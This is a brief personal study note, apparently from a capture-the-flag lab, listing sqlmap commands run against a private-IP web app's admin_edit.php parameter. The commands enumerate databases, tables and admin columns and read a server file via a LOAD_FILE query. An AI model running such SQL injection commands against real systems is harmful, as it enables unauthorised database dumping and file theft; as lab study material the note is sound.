 07-08-2024 20:22
Status: #idea
Tags: [[Exploiting]]

# SQLMap

Comandos usados:

- `sqlmap -u http://10.10.48.53:84/admin_edit.php?bookisbn=1 --dbs`: Obtemos as bases de datos
- `sqlmap -u http://10.10.48.53:84/admin_edit.php?bookisbn=1 -D www_project -T admin --columns`: Obtemos as columnas da tabla admin, na base de datos www_project.
- `sqlmap -u http://10.10.48.53:84/admin_edit.php?bookisbn=1 -D www_project --tables`: Danos as tablas da base de datos.
- sqlmap -u http://10.10.80.230:84/admin_edit.php?bookisbn=1 --\sql-query "select LOAD_FILE('/opt/flag.txt')": Leer archivos.




---
# {{References}}